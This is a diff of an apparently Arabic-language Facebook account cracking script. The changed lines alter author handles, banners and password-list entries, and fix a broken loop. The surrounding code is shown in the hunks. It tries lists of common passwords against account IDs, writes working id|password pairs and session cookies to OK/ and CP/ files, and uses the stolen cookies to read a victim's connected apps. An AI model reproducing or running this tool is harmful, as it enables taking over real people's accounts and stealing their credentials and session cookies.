@@ -31,14 +31,13 @@ if (x.strftime("%x"))>(g.strftime("%x")):
  print('\n\n')
  print('\n\n')
  print(x)
-
  
 
 if (x.strftime("%x"))==(g.strftime("%x")):
    print('')
    if(x.strftime("%X"))>(g.strftime("%X")):
     print('\n\n')
-    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @Islam85555🗿')
+    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @F_1_9 ☄️🗿')
     print('\n\n')
     print(x)
     
@@ -49,7 +48,7 @@ else:
     print('')
     
 os.system('clear')
-print('               مرحب بك في اداء اسلام الجوكر               ')
+print('                  مرحب بكم في اداء اسلام الجوكر           ')
 token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
@@ -344,7 +343,7 @@ def menu(my_name,my_id):
 	os.system('clear')
 	from rich.panel import Panel as Ch
 	from rich import print as code
-	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10 لا تنسوا صور   ')) 
+	code(Ch('   لا تنسى صور الصيد الصيد   💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10   ')) 
 	print('')
 	print(a16+'▭▬'*30)
 	print(f"\033[97;1m[\033[92;1m1\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[{MJ3}CRACK PUBLIC\x1b[36m\x1b[33m]")
@@ -668,7 +667,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('Aa123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -718,7 +717,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('qwerty123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -770,7 +769,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print ('\x1b[36m|CP.|')
 				xda = f'\r[[CP]] ➨ {idf} | {pw} '
-				print ('\x1b[36m―――――― للاسف اسلام جاب لك حساب سكيور――――――――――――')
+				print ('\x1b[36m――――――――― اسلام جاب لك حساب سكيور――――――――――――')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -784,7 +783,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				raven_a = f'\r[[@bsbsjhh]@Islam85555] اسلام ➨ {idf} | {pw} | \n \n{kuki} '
-				print ('\x1b[32m――――――――― اسلام جاب لك حساب شغال――――――――――')
+				print ('\x1b[32m―――――― اسلام جاب لك حساب شغال――――――')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				statusok1 = nel(raven_a, style='green')
 				cetak(nel(statusok1, title='OK'))
@@ -805,8 +804,8 @@ def cek_RAVEN(kuki):
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	try:
-		for i in range(len(
-      print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
 		print ("\r    %s\033[0m cookie invalid"%(M))
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
